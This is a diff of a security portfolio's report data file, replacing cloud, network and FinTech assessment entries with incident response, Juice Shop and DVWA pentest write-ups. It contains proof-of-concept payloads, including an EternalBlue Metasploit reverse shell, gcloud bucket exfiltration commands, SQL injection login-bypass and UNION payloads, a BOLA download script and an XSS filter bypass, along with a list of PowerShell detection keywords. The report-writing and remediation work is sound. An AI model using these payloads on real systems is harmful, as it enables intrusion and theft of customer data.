+    tools: ["Microsoft Defender for Endpoint (EDR)", "Elastic SIEM", "Velociraptor", "Wireshark", "Windows Event Log analysis", "MITRE ATT&CK Navigator"],
+    timeline: "3.5 hours to containment — incident date April 12, 2025. Report HSS-IR-RPT-2025-002 v1.0 Final.",
+    outcome: "Breach confirmed on Workstation-23; lateral movement to HR-SQL01 and DevAppServer was attempted but blocked before authentication succeeded. No client data confirmed exposed. Containment achieved in 3.5 hours (target: 6 hours). Three root causes identified and remediation roadmap delivered. HIPAA breach notification not required at this time pending completion of forensic memory analysis.",
     lessonsLearned: [
-      "Snapshot immutability is only useful if the retention lock period exceeds the attacker's dwell time — a 24-hour window is essentially no protection against a patient adversary.",
-      "Service account over-privilege is the single most common lateral movement enabler in cloud environments — periodic IAM reviews with automated alerting on permission escalations are essential.",
-      "The IR playbook had never been timed end-to-end against a realistic scenario — the drill revealed three steps that were ambiguous and added ~45 minutes of confusion.",
-      "Cloud audit logs are often turned off for verbose API calls to save cost — but those are exactly the logs ransomware actors depend on you not having.",
-      "Recovery drills should be run quarterly, not annually — storage costs for a sandbox environment are trivial compared to the cost of an untested playbook during a real incident.",
+      "Stale account management is a persistent gap that enables real incidents — a departed employee's AD account, still valid 28 days after resignation, was the credential that enabled the lateral movement attempt. Automated offboarding with same-day account deactivation would have broken this attack chain.",
+      "Endpoint detection depends on telemetry — PowerShell logging being disabled on 30% of endpoints created blind spots that delayed reconstruction of the full kill chain. Uniform logging configuration should be enforced via GPO with compliance monitoring.",
+      "IR playbooks that are never tested go stale — the 2022 playbook referenced incorrect contact numbers and had no pre-authorised containment decision tree, adding unnecessary confusion during active response. Annual tabletop exercises against the playbook are the only reliable way to keep it current.",
+      "Honeypots provide high-fidelity alerts with near-zero false positives — the internal honeypot was the single detection mechanism that caught the lateral movement attempt. Low-interaction honeypots in sensitive network segments are a high-value, low-effort detection layer.",
+      "Blast-radius assessments must consider worst-case impact, not just confirmed impact — the actual outcome was 'no breach confirmed', but the near-miss scenario (EHR source code theft, HIPAA notification across 50+ healthcare clients) illustrates why the three root causes needed to be fixed before the incident occurred.",
     ],
     findings: [
       {
-        id: "f3",
-        title: "Backup Snapshot Immutability Window — 24-Hour Deletion Gap",
+        id: "r2-f1",
+        title: "Stale Active Directory Account — 28-Day Offboarding Gap",
         severity: "critical",
         cvss: "9.1",
-        affected: "GCP Cloud Storage — snapshot retention policy on production buckets",
-        body: "Snapshot retention policy was configured with a 24-hour lock period. Any IAM principal with `storage.buckets.delete` or `storage.objects.delete` permissions could delete snapshots within the lock window before the immutability constraint activated. A ransomware actor with a compromised admin account could delete all snapshots within minutes of gaining access — well within the 24-hour window.",
-        impact: "Complete loss of backup data, eliminating the primary recovery mechanism. Without snapshots, recovery would require rebuilding from source code and a 6-month-old cold archive, making the actual RTO 5–7 business days rather than the target 4 hours.",
-        remediation: "Increase snapshot lock period to 30 days minimum. Remove snapshot deletion permissions from all service accounts and restrict to a dedicated break-glass IAM group with MFA enforcement. Enable Cloud Audit Logs for all Storage API calls. Create an alerting rule for any snapshot deletion event that fires within the retention window.",
+        affected: "Active Directory — jcampbell account (departed developer, Finance-adjacent access)",
+        body: "A developer (jcampbell) who resigned 28 days before the incident had an Active Directory account that was never disabled. The attacker used jcampbell's credentials (likely obtained via the phishing payload or a credential database) to attempt SSH authentication to the DevAppServer in the DMZ. The account was valid and the attempt would have succeeded had the honeypot not triggered an alert.",
+        impact: "Valid credentials for a departed employee gave the attacker a legitimate-looking identity for lateral movement, evading user-context anomaly detection. Had the SSH attempt succeeded, the attacker would have had access to the proprietary EHR source code — a breach with HIPAA notification obligations and direct competitive impact.",
+        remediation: "Implement automated account deactivation triggered on the HR offboarding workflow — target same-business-day deactivation for all separating employees. Audit all AD accounts monthly against the active employee roster. Add a conditional access policy blocking authentication from accounts flagged as offboarded-pending-review.",
       },
       {
-        id: "f4",
-        title: "Service Account Over-Privilege — Org-Wide Storage Read",
+        id: "r2-f2",
+        title: "PowerShell Logging Disabled on 30% of Endpoints",
         severity: "high",
-        cvss: "8.3",
-        affected: "sa-data-pipeline@project.iam.gserviceaccount.com",
-        body: "The data pipeline service account was granted `roles/storage.objectViewer` at the organisation level rather than the bucket level. This gave the account read access to all Cloud Storage buckets across the entire GCP organisation — including backups, audit log exports, and other project data. After simulating initial compromise of the pipeline workload, this account was used to exfiltrate data from 14 unrelated buckets before any alert fired.",
-        impact: "A single compromised pipeline workload becomes an exfiltration pivot for the entire organisation's cloud storage. Exfil of sensitive data from unrelated projects (PII, financial records, audit logs) would amplify the breach scope significantly beyond the initial compromise.",
-        remediation: "Apply the principle of least privilege: bind all service accounts to the specific buckets they require, not at folder or organisation level. Audit all org-level IAM bindings quarterly. Use VPC Service Controls to restrict Storage API access to approved networks. Add an anomaly detection rule for service accounts accessing buckets outside their normal scope.",
-        poc: `# Simulate exfil from a compromised pipeline service account
-# (account has roles/storage.objectViewer @ org level)
-
-gcloud storage ls gs://  # lists ALL buckets org-wide — should not be possible
-
-# Enumerate buckets in other projects
-gcloud storage buckets list --project=OTHER_PROJECT_ID
-
-# Exfil from backup bucket (different project)
-gcloud storage cp gs://backup-prod-2024/snapshots/ ./exfil/ --recursive`,
+        cvss: "7.8",
+        affected: "Endpoint fleet — 30% of Windows endpoints including Workstation-23",
+        body: "PowerShell script block logging, module logging, and transcription were not enabled uniformly across the endpoint fleet. Workstation-23 was in the 30% without logging. The attacker's PowerShell-based payload (initial access stage) and C2 commands could not be fully reconstructed from SIEM data — investigators had to rely on EDR memory artefacts, which provided a partial picture only.",
+        impact: "Incomplete kill chain reconstruction extends investigation time and may leave attacker tooling or persistence mechanisms undetected. In a breach scenario, missing logs are a forensic liability — they may constitute an evidence gap in regulatory investigations and complicate HIPAA breach notification scoping.",
+        remediation: "Enforce PowerShell Constrained Language Mode, Script Block Logging, and Module Logging via Group Policy Object across 100% of Windows endpoints. Monitor GPO compliance with a weekly automated report. Forward all PowerShell logs to the SIEM with alerting on high-risk cmdlets (Invoke-Expression, DownloadString, -EncodedCommand).",
       },
     ],
   },
   {
     id: "r3",
-    title: "Vulnerability Assessment — Internal Network Q4",
-    type: "vuln",
-    teaser: "EternalBlue still running in production. Default SNMP strings broadcasting the whole network layout. The last audit missed both.",
+    title: "Web Application Pentest — OWASP Juice Shop",
+    type: "pentest",
+    teaser: "Login bypassed without a password. Every customer's email and hashed password downloadable in one API request. Nine confirmed vulnerabilities in a platform about to go live.",
     pdfUrl: "/projects_docs/Manual%20And%20Tool-Assisted%20Penetration%20Test.pdf",
-    target: "Internal corporate network — servers, workstations, and network infrastructure",
-    scope: "192.168.0.0/16 internal network: servers (Windows/Linux), managed switches, routers, and printers. Excludes OT/ICS segment and VoIP VLAN.",
-    purpose: "Conduct a quarterly internal vulnerability assessment to identify unpatched systems, misconfigurations, and exposed legacy services before year-end compliance audit.",
-    why: "ISO 27001 compliance obligations required quarterly internal assessments. Q3 findings had not been fully remediated, and leadership wanted a fresh snapshot to present to the external auditor with accurate risk scores and a remediation roadmap.",
+    target: "OWASP Juice Shop e-commerce platform — pre-launch security review",
+    scope: "Full web application attack surface: authentication, authorisation, input handling, session management, access controls, and API endpoints. Approached as an external adversary with no prior access or insider knowledge.",
+    purpose: "Conduct a manual and tool-assisted penetration test of the OWASP Juice Shop e-commerce platform to determine whether it could withstand a real-world attack before going live, assessing the full OWASP Top 10 exposure.",
+    why: "The platform was approaching launch readiness and had not been subjected to an independent security review. Leadership needed a definitive assessment of whether the application was safe to expose to the public, particularly given that it handled customer account data and payment-adjacent workflows.",
     methodology: [
-      "Network discovery: Nmap TCP SYN scan (-sS) across all RFC-1918 ranges to identify live hosts and open ports.",
-      "Service enumeration: version detection (-sV) and default script execution (-sC) on all discovered hosts.",
-      "Vulnerability scanning: OpenVAS and Nessus scans against discovered hosts; cross-referenced results to reduce false positives.",
-      "Manual validation: hand-verified critical and high findings before reporting to confirm exploitability and eliminate scanner noise.",
-      "Risk rating: CVSS v3.1 base scores adjusted with environmental and temporal metrics for the specific network context.",
+      "Phase 1 — Reconnaissance: enumerated the application surface through manual browsing, reviewing JavaScript source files, and identifying all API endpoints and input vectors.",
+      "Phase 2 — Vulnerability discovery: applied OWASP Testing Guide methodology to systematically test authentication, authorisation, session management, input validation, access controls, and error handling.",
+      "Phase 3 — Controlled exploitation: actively exploited confirmed vulnerabilities to demonstrate real-world impact — including authentication bypass via SQL injection, cross-customer data access, and admin panel enumeration.",
+      "Phase 4 — Documentation and reporting: all findings documented with reproduction steps, evidence screenshots, CVSS v3.1 scores, and prioritised remediation recommendations.",
+      "Ethical framework: testing conducted in an isolated environment with explicit written authorisation. No production data was accessed. All exploits were non-destructive and reversible.",
     ],
-    tools: ["Nmap", "OpenVAS", "Nessus Essentials", "Metasploit (validation only)", "Wireshark", "enum4linux"],
-    timeline: "3 days (1 day scanning + 1 day validation + 1 day reporting)",
-    outcome: "Identified 3 confirmed vulnerabilities (2 critical, 1 medium, 1 low). The critical EternalBlue finding required immediate emergency patching; the remaining findings were scheduled into the next sprint cycle.",
+    tools: ["Burp Suite", "OWASP ZAP", "browser DevTools", "SQLmap (validation)", "Postman", "manual analysis"],
+    timeline: "2 days — 02–03 May 2026",
+    outcome: "Nine vulnerabilities confirmed across the full OWASP Top 10 spectrum. Two critical findings: SQL injection that bypasses authentication entirely, and an API endpoint that exposes the complete customer database to any logged-in user. The overall verdict: the platform was not safe to launch as assessed.",
     lessonsLearned: [
-      "Legacy Windows hosts in internal segments are often forgotten by patch management tools — manual inventory reconciliation against AD is essential before any assessment.",
-      "SNMP v2 with default community strings is shockingly common even in mature environments; it's worth scanning for as a first-pass quick win.",
-      "Automated scanner results need manual validation — both OpenVAS and Nessus produced false positives on the FTP finding that would have wasted remediation effort.",
-      "Presenting risk findings to non-technical leadership requires mapping CVEs to business impact scenarios, not just severity scores.",
-      "Patch management SLAs need enforcement mechanisms — the EternalBlue host had been flagged in Q3 and not remediated because there was no accountability owner.",
+      "SQL injection in authentication flows is still possible when parameterised queries are not consistently enforced — a single unparameterised login query undermines the entire access model.",
+      "BOLA/IDOR on API endpoints requires testing with a logged-in account, not just unauthenticated access — some of the worst findings in this assessment only surfaced after authenticating.",
+      "Administrative panels left accessible to all users are an easy finding to detect and an even easier one to fix — URL enumeration and directory brute-forcing should always be in scope.",
+      "Client-side input controls (HTML maxlength, JavaScript validation) provide zero security benefit — all meaningful validation must be enforced on the server side.",
+      "Testing for broken authentication (brute force, password reset flows) requires patience and systematic enumeration — automated tools alone often miss logic flaws in multi-step flows.",
     ],
     findings: [
       {
-        id: "f5",
-        title: "Unpatched EternalBlue (MS17-010) on Legacy Windows Server",
+        id: "r3-f1",
+        title: "SQL Injection — Authentication Bypass (Login)",
         severity: "critical",
         cvss: "9.8",
-        affected: "WINSVR-LEGACY-03 (Windows Server 2012 R2) — 192.168.15.43",
-        body: "One Windows Server 2012 R2 host remained unpatched for MS17-010 (EternalBlue SMB vulnerability, CVSS 9.8) and was accessible from the DMZ VLAN. The vulnerability allows unauthenticated remote code execution via a crafted SMB packet to port 445. This is the same vulnerability exploited by WannaCry and NotPetya ransomware campaigns in 2017.",
-        impact: "Unauthenticated remote code execution with SYSTEM-level privileges. An attacker with network access to the host — including anyone on the DMZ — could achieve full server compromise, use it as a lateral movement pivot, or deploy ransomware. The host was running a legacy reporting application with database credentials stored in config files.",
-        remediation: "Apply Microsoft patch KB4012212 immediately (emergency change). If patching is not immediately possible, disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`) and isolate the host from DMZ access via firewall ACL as a temporary mitigation. Decommission the host and migrate the legacy application to a supported OS as the long-term fix. Add automated detection for unpatched MS17-010 to the quarterly scan baseline.",
-        poc: `# Validation using Metasploit (lab environment only)
-# DO NOT run against production systems without written authorisation
+        affected: "POST /rest/user/login — email and password fields",
+        body: "The login endpoint was vulnerable to SQL injection via the email field. Submitting a specially crafted email value caused the backend SQL query to evaluate as always-true, bypassing the password check and granting full administrator access to the application without any valid credentials.",
+        impact: "Complete authentication bypass. Any unauthenticated attacker can gain instant administrator access to the platform — including access to all customer orders, account management, and administrative functions — with no account required. This is the highest severity authentication vulnerability class.",
+        remediation: "Replace all raw SQL query construction with parameterised queries or prepared statements. Conduct an audit of every database query in the codebase for the same pattern. Implement a WAF rule for SQL keyword injection as a defence-in-depth layer (not a primary fix). Enable anomaly alerting for high login failure rates.",
+        poc: `# Authentication bypass via SQL injection in email field
+# Payload: ' OR 1=1--
 
-msf6 > use exploit/windows/smb/ms17_010_eternalblue
-msf6 exploit > set RHOSTS 192.168.15.43
-msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6 exploit > set LHOST 192.168.1.100
-msf6 exploit > run
+# Step 1: Send crafted POST request
+POST /rest/user/login HTTP/1.1
+Content-Type: application/json
 
-# Expected output (vulnerable host):
-# [*] Started reverse TCP handler on 192.168.1.100:4444
-# [+] 192.168.15.43:445 - ETERNALBLUE overwrite completed
-# [*] Meterpreter session 1 opened`,
+{"email":"' OR 1=1--","password":"anything"}
+
+# Step 2: Server returns 200 OK with JWT token for admin account
+# {"authentication":{"token":"eyJhbGci...","bid":1,"umail":"admin@juice-sh.op"}}
+
+# Fix: parameterised query (Node.js / Sequelize)
+const user = await User.findOne({ where: { email: req.body.email } });
+if (user && bcrypt.compare(req.body.password, user.passwordHash)) { /* grant access */ }`,
       },
       {
-        id: "f6",
-        title: "Default SNMP Community Strings on Network Devices",
-        severity: "medium",
-        cvss: "5.3",
-        affected: "12 managed switches and routers across core and distribution layers",
-        body: "Twelve network devices (Cisco Catalyst switches and an HP router) were configured with the default SNMPv2 community string 'public' for read access. SNMP v2 transmits community strings in cleartext. Using these strings, an attacker with network access can enumerate the full network topology, ARP tables, routing tables, interface statistics, and device configurations.",
-        impact: "Full network topology disclosure. An attacker could map the internal network layout, identify high-value targets, and plan lateral movement routes without generating any notable log entries. Topology information dramatically reduces the reconnaissance phase of a targeted attack.",
-        remediation: "Change all SNMP community strings to randomised 20+ character values. Disable SNMP v2 and migrate to SNMPv3 with authentication and privacy (AES-128 minimum). Restrict SNMP access to dedicated management VLAN via ACL. Consider disabling SNMP entirely on devices where it is not actively used for monitoring.",
+        id: "r3-f9",
+        title: "Broken Access Control — Full Customer Database via API",
+        severity: "critical",
+        cvss: "9.1",
+        affected: "GET /api/Users/ — customer database endpoint",
+        body: "Any authenticated user could request the full customer database by sending a GET request to the /api/Users/ endpoint. No role check, ownership check, or pagination was enforced. The endpoint returned every customer's email address, hashed password, and user ID in a single response.",
+        impact: "Complete customer data exposure. An attacker authenticated as any ordinary customer can extract all user records — emails and hashed passwords — in a single HTTP request. Password hash cracking (especially for weak passwords) would then give full account access for multiple customers.",
+        remediation: "Restrict the /api/Users/ endpoint to admin-role users only, enforced at the server layer. Add server-side pagination and rate limiting to prevent bulk data extraction. For ordinary users, return only their own record. Add automated BOLA testing to the regression suite using two separate test accounts.",
       },
       {
-        id: "f7",
-        title: "Active Cleartext FTP Service on File-Transfer Server",
-        severity: "low",
-        cvss: "3.7",
-        affected: "FTP-SRV-01 (Ubuntu 18.04) — 192.168.20.12, port 21",
-        body: "An FTP server (vsftpd 3.0.3) remained active on the file-transfer server for a legacy integration with a third-party vendor. FTP transmits both credentials and file content in cleartext. Wireshark capture on the same VLAN confirmed that authentication credentials were visible in packet captures during a test transfer.",
-        impact: "Any user with access to the internal VLAN can passively capture FTP credentials and file contents using a network tap or ARP spoofing. Credential capture could enable further access to the FTP server and any other services sharing the same password.",
-        remediation: "Migrate the legacy vendor integration to SFTP (SSH File Transfer Protocol) on port 22. If the vendor cannot support SFTP, use FTPS (FTP over TLS) as a compromise. Disable the plain FTP service (`systemctl disable vsftpd && systemctl stop vsftpd`) once the migration is complete. Audit whether the FTP credentials are reused on any other internal systems.",
+        id: "r3-f2",
+        title: "Cross-Site Scripting (XSS) — Code Injection via Search Input",
+        severity: "high",
+        cvss: "7.4",
+        affected: "GET /rest/products/search?q= — product search endpoint",
+        body: "The product search input was vulnerable to reflected XSS. User-supplied input in the search query parameter was rendered directly into the HTML response without encoding. A crafted URL containing a JavaScript payload could silently execute code in the victim's browser session.",
+        impact: "An attacker who tricks a logged-in customer into clicking a crafted link can steal their session token, impersonate them, read their order history, or perform actions on their behalf. In a phishing campaign context, this can be used to silently harvest customer sessions at scale.",
+        remediation: "Apply output encoding on all user-controlled values rendered into HTML responses. Use a templating engine that auto-encodes by default. Implement a Content Security Policy (CSP) header to limit script execution to trusted sources as a defence-in-depth measure.",
+      },
+      {
+        id: "r3-f4",
+        title: "Broken Access Control — Customer Basket Data Accessible Without Ownership Check",
+        severity: "high",
+        cvss: "8.1",
+        affected: "GET /rest/basket/:id — basket retrieval endpoint",
+        body: "Authenticated customers could access the basket contents of other customers by iterating the numeric basket ID in the URL path. The endpoint verified authentication but did not verify that the requesting user owned the requested basket. Basket IDs were sequential integers.",
+        impact: "Any authenticated customer can view the basket contents (items, quantities, prices) of all other customers. This leaks purchasing intent and personal preferences, and confirms account existence. It also demonstrates a systemic lack of object-level authorisation — the same pattern likely affects other endpoints.",
+        remediation: "Add an ownership check to all resource retrieval endpoints: verify that the authenticated user's account ID matches the resource owner before returning data. Replace sequential integer IDs with UUIDs to eliminate enumeration as an attack vector.",
+      },
+      {
+        id: "r3-f6",
+        title: "Broken Authentication — Account Takeover via Password Reset",
+        severity: "high",
+        cvss: "8.1",
+        affected: "Password reset flow — /rest/user/reset-password",
+        body: "The password reset mechanism relied on a security question whose answer could be guessed or socially engineered. After answering the security question, the application allowed setting a new password for the account with no additional verification. This allowed full account takeover for any account whose security question answer was known or guessable.",
+        impact: "Full account takeover without knowledge of the current password. For a targeted attack, an attacker with basic knowledge about a customer (which social media provides) can reset their password and gain complete access to their account, orders, and payment details.",
+        remediation: "Replace security question-based reset with a time-limited reset link delivered to the registered email address. Invalidate the reset token after use and expire it after 15 minutes. Log all reset attempts and alert on multiple failed attempts from the same IP.",
       },
     ],
   },
   {
     id: "r4",
-    title: "Web App Pentest — FinTech Client Portal",
+    title: "XSS Security Assessment — DVWA (SkyLock Cyber Defence)",
     type: "pentest",
-    teaser: "A date-range filter that broke SQL isolation. An API endpoint that let any user download any account's statements. Two critical flaws in a live financial portal.",
+    teaser: "Mixed-case payload bypassed the Medium security filter. Stored XSS fired on every page load. CSRF at Medium level went unprotected — and the Impossible level showed exactly why output encoding works.",
     pdfUrl: "/projects_docs/Web%20Application%20Security.pdf",
-    target: "FinTech client-facing web portal (production) — account management, transaction history, and statement download flows",
-    scope: "Authenticated and unauthenticated attack surface of the customer-facing portal. Excludes mobile app API and internal admin panel (separate engagement).",
-    purpose: "Perform an authenticated penetration test of the FinTech client portal to assess OWASP Top 10 exposure, with particular focus on financial data access controls and transaction integrity.",
-    why: "Regulatory pressure from the Central Bank's cybersecurity framework required the client to conduct annual penetration tests of all customer-facing systems. The prior year's report had flagged authorisation controls as a concern — this engagement followed up with deeper testing of those specific areas.",
+    target: "DVWA — Damn Vulnerable Web Application at Medium and Impossible security levels",
+    scope: "XSS vulnerability testing across Medium and Impossible DVWA security levels. In scope: Reflected XSS, Stored XSS, CSRF, source code review, and output encoding analysis.",
+    purpose: "Assess the effectiveness of DVWA's Medium and Impossible security level controls against XSS and related injection attacks, demonstrating the real-world difference between weak input filtering (Medium) and proper output encoding (Impossible).",
+    why: "Understanding the security delta between filter-based defences and encoding-based defences is a core competency for web application security work. DVWA's Medium level represents a common real-world pattern — developers add basic filters but don't encode output — making it a high-value target for demonstrating bypass techniques. The Impossible level demonstrates why only server-side output encoding reliably prevents XSS.",
     methodology: [
-      "Authenticated session analysis: captured all API requests during normal customer workflows using Burp Suite proxy to build a complete endpoint inventory.",
-      "Authorisation testing: created two test customer accounts (different customers, different statement datasets) and cross-tested all object references between them.",
-      "Input validation: automated Burp active scan against all identified endpoints; manually tested transaction filter parameters for injection vulnerabilities.",
-      "Transport security review: checked TLS configuration (testssl.sh), HSTS headers, cookie security flags, and CORS policy.",
-      "Session management: tested session fixation, token entropy, logout handling, and concurrent session controls.",
+      "Phase 1 — Environment configuration: configured DVWA at Medium and Impossible security levels; verified PHP source code was accessible for analysis to support white-box review.",
+      "Phase 2 — Reconnaissance: identified all injection points in scope (XSS reflected search field, stored XSS name field) and reviewed DVWA PHP source for each level to understand applied controls.",
+      "Phase 3 — Active exploitation (WSTG-INPV-01, WSTG-INPV-02): tested Reflected and Stored XSS at Medium level, attempting payload bypass using case manipulation, encoding, and alternative event handlers.",
+      "Phase 4 — Source code review: compared Medium and Impossible PHP source to identify why Medium failed (blacklist filtering) and why Impossible succeeded (htmlspecialchars() output encoding).",
+      "Rules of engagement: testing conducted in an isolated lab environment. No real user data or production systems involved.",
     ],
-    tools: ["Burp Suite Pro", "testssl.sh", "sqlmap (validation)", "OWASP ZAP", "jwt_tool", "Postman"],
-    timeline: "4 business days",
-    outcome: "Identified 3 valid findings (1 critical, 1 high, 1 low). The SQL injection finding was the most severe — it allowed full database extraction via the transaction date filter with no authentication bypass required. All findings were remediated within 2 weeks of report delivery.",
+    tools: ["Burp Suite", "browser DevTools", "DVWA (PHP source access)", "manual payload crafting"],
+    timeline: "Single session — 1 May 2026 | Report v1.0 Final",
+    outcome: "Three active XSS vulnerabilities confirmed at Medium level: Reflected XSS bypass via mixed-case payload, Stored XSS in the name field with no output encoding, and CSRF with no token protection. Impossible level closed all three vulnerabilities through consistent htmlspecialchars() output encoding — demonstrating that output encoding is the only reliable XSS defence.",
     lessonsLearned: [
-      "SQL injection in financial APIs is still distressingly common — raw query concatenation often persists in 'internal' or 'admin' endpoints that were deprioritised for security review.",
-      "BOLA/IDOR findings in financial systems require two test accounts with distinct, non-overlapping data sets — using a single account makes cross-customer access impossible to demonstrate clearly.",
-      "HSTS misconfiguration is trivial to fix but requires an explicit deployment step — it should be in the deployment checklist, not left to developers to remember.",
-      "sqlmap is useful for confirming SQL injection but its output is noisy and often over-reports; manual verification of the injection point is always worth doing before including it in a report.",
-      "Providing a 'risk-ordered' remediation table (not just CVSS-ordered) dramatically helps development teams prioritise — a critical finding in a low-traffic endpoint may be less urgent than a high finding in the main checkout flow.",
+      "Input filtering (blacklists) is not a reliable XSS defence — any blacklist can be bypassed with case variation, encoding, or alternative syntax. Output encoding must be applied at render time.",
+      "htmlspecialchars() in PHP (or equivalent in other languages) applied to all user-controlled data before rendering into HTML is the single most important XSS countermeasure.",
+      "Stored XSS is more dangerous than Reflected XSS because the payload executes on every page load for every user who views the infected page — not just users who click a crafted link.",
+      "CSRF token validation must be tied to the user session server-side — client-side controls are easily bypassed. CSRF and XSS often chain: XSS can extract CSRF tokens and use them for cross-site state changes.",
+      "Source code review alongside dynamic testing reveals the root cause immediately — seeing that Medium uses str_replace() while Impossible uses htmlspecialchars() explains the entire security delta in one comparison.",
     ],
     findings: [
       {
-        id: "f8",
-        title: "SQL Injection in Transaction Date-Range Filter",
-        severity: "critical",
-        cvss: "9.8",
-        affected: "GET /api/transactions?from=<date>&to=<date>",
-        body: "The `from` and `to` date parameters in the transaction history filter were concatenated directly into a raw SQL query without parameterisation. The application used string formatting to build the WHERE clause, and no input validation or WAF was in place for the API endpoint. Confirmed time-based blind SQLi via `SLEEP()` injection; escalated to UNION-based extraction to confirm full database read access.",
-        impact: "Full database read access without any privilege escalation. The database user had SELECT rights across all application tables including customer PII (name, address, national ID), account balances, full transaction histories, hashed passwords, and internal audit logs. Exploiting this vulnerability would constitute a notifiable data breach under applicable regulations.",
-        remediation: "Immediately switch to parameterised queries (prepared statements) for all database interactions — no string concatenation in SQL. Audit all other API endpoints for the same pattern. Apply principle of least privilege to the database user: the API account should have SELECT only on the tables it needs. Deploy a WAF rule targeting SQL keyword injection as a defence-in-depth measure (not a primary fix).",
-        poc: `# Step 1: Confirm time-based blind SQLi
-curl -s "https://portal.fintech-client.example/api/transactions?\\
-  from=2024-01-01' AND SLEEP(5)--&to=2024-12-31"
-# Response delays ~5 seconds → confirmed SQLi
-
-# Step 2: UNION-based extraction (DB version)
-# from=2024-01-01' UNION SELECT 1,version(),3,4,5--
-
-# Step 3: Extract customer table (simplified)
-# from=2024-01-01' UNION SELECT customer_id,email,full_name,
-#   national_id,account_number FROM customers LIMIT 10--
-
-# Parameterised query fix (Node.js / pg example):
-const result = await db.query(
-  'SELECT * FROM transactions WHERE date BETWEEN $1 AND $2',
-  [req.query.from, req.query.to]  // parameterised — safe
-);`,
-      },
-      {
-        id: "f9",
-        title: "Broken Object-Level Authorisation on Statement Downloads",
+        id: "r4-f1",
+        title: "Reflected XSS — Mixed-Case Filter Bypass at Medium Level",
         severity: "high",
-        cvss: "8.1",
-        affected: "GET /api/statements/:statement_id/download",
-        body: "Authenticated customers could download monthly statements belonging to other customers by iterating the `statement_id` path parameter. The endpoint verified that the user was authenticated but did not verify that the requested statement belonged to the requesting user's account. Statement IDs were sequential integers starting from 1.",
-        impact: "Any authenticated customer could enumerate and download statements for all other customers. Monthly statements contain full transaction histories, account balances, and personal details. In a financial context, this is a serious breach of customer confidentiality and a regulatory violation.",
-        remediation: "Add an ownership check in the service layer: verify that the statement's account_id matches the authenticated user's account_id before returning any data. Replace sequential integer IDs with UUIDs on all customer-facing resources to eliminate enumeration as an attack vector. Add an automated BOLA test to the regression suite using two test accounts.",
-        poc: `# Two test accounts: user A (statement_id=4421), user B (statement_id=6800)
-# Logged in as user A:
+        cvss: "7.4",
+        affected: "DVWA Reflected XSS input field — Medium security level",
+        body: "DVWA Medium level used a PHP str_replace() blacklist to strip '<script>' tags from input. The filter was case-sensitive. Submitting '<Script>' (capital S) bypassed the filter entirely, and the payload was rendered into the HTML response and executed by the browser. Mixed-case is one of dozens of known bypass techniques for blacklist-based XSS filters.",
+        impact: "Reflected XSS execution in the victim's browser context. An attacker who crafts a malicious link and tricks a user into clicking it can execute arbitrary JavaScript — stealing session cookies, logging keystrokes, redirecting to phishing pages, or performing actions on the user's behalf.",
+        remediation: "Replace blacklist filtering with server-side output encoding: apply htmlspecialchars($input, ENT_QUOTES, 'UTF-8') to all user-controlled values before rendering into HTML. Input filtering can be applied in addition but must never be the sole defence.",
+        poc: `<!-- DVWA Medium level: filter blocks <script> but not <Script> -->
 
-import requests, io
+<!-- Step 1: Standard payload blocked -->
+<script>alert('XSS')</script>
+<!-- Filter output: alert('XSS') — tag stripped -->
 
-token_a = "eyJhbGci..."  # valid token for user A
+<!-- Step 2: Mixed-case bypass executes -->
+<Script>alert('XSS')</Script>
+<!-- Browser renders and executes the alert -->
 
-# Access user B's statement — should be 403, returns 200
-r = requests.get(
-    "https://portal.fintech-client.example/api/statements/6800/download",
-    headers={"Authorization": f"Bearer {token_a}"},
-)
-print(r.status_code)          # 200 — confirms BOLA
-print(r.headers["Content-Type"])  # application/pdf
-with open("stolen_statement.pdf", "wb") as f:
-    f.write(r.content)`,
+<!-- Root cause (DVWA Medium PHP source): -->
+$name = str_replace( '<script>', '', $_GET[ 'name' ] );
+// Case-sensitive — bypassed by <Script>, <SCRIPT>, etc.
+
+<!-- Fix (DVWA Impossible PHP source): -->
+$name = htmlspecialchars( $_GET[ 'name' ] );
+// Converts < > " ' & to HTML entities — no bypass possible`,
       },
       {
-        id: "r4-f10",
-        title: "Missing HSTS Header on Login Subdomain",
-        severity: "low",
-        cvss: "3.7",
-        affected: "https://login.portal.fintech-client.example",
-        body: "The login subdomain (`login.portal.fintech-client.example`) did not include a `Strict-Transport-Security` (HSTS) header. The main application domain had HSTS configured, but the login subdomain — deployed separately — was missed. On networks where an attacker can intercept traffic (public Wi-Fi, hostile network), this allows an SSL stripping attack to downgrade the HTTPS connection to HTTP.",
-        impact: "On a hostile network, an attacker performing SSL stripping could intercept customer credentials submitted on the login page over HTTP. While exploitation requires network-level access (not trivially achieved), the login page is the highest-value target and should have the strongest transport security.",
-        remediation: "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to the login subdomain's server configuration. Verify HSTS is applied at the load balancer level, not just the application, to prevent subdomain gaps when deploying new services. Add to the deployment checklist.",
+        id: "r4-f2",
+        title: "Stored XSS — Name Field Not Encoded at Medium Level",
+        severity: "high",
+        cvss: "7.4",
+        affected: "DVWA Stored XSS — name input field at Medium security level",
+        body: "The stored XSS name field at Medium level applied a character length limit (maxlength=10) via an HTML attribute but did not encode user input before storing it in the database or before rendering it back to the page. Bypassing the client-side length limit via browser DevTools allowed a full XSS payload to be submitted. Once stored, the payload executed on every page load for every user who viewed the guestbook.",
+        impact: "Persistent XSS that fires automatically for every user visiting the affected page. Unlike reflected XSS, no user interaction beyond visiting the page is required. An attacker could use this to steal session tokens across all current and future visitors, effectively compromising multiple accounts from a single submission.",
+        remediation: "Store only sanitised or encoded data. Apply htmlspecialchars() before rendering stored user input to the page. Enforce length limits server-side — never rely on HTML attribute maxlength for security. Implement a CSP header restricting inline script execution.",
+      },
+      {
+        id: "r4-f3",
+        title: "No CSRF Protection at Medium Security Level",
+        severity: "medium",
+        cvss: "5.4",
+        affected: "DVWA CSRF module — Medium security level",
+        body: "The DVWA CSRF module at Medium level performed no server-side CSRF token validation. A forged cross-origin POST request could change the logged-in user's password without their knowledge. The only protection present was a Referer header check, which can be omitted or spoofed in some browser configurations and is not a reliable CSRF defence.",
+        impact: "An attacker who tricks a logged-in DVWA user into visiting a crafted page can silently change their password, locking them out of their account. CSRF is particularly dangerous in admin-level accounts where the forged action can affect the entire application.",
+        remediation: "Implement server-side CSRF token validation using the Synchronizer Token Pattern: generate a unique, session-bound token for each form, include it in the form as a hidden field, and verify it server-side on every state-changing request. The SameSite cookie attribute (Strict or Lax) provides additional CSRF protection as a complementary layer.",
       },
     ],
   },
   {
     id: "r5",
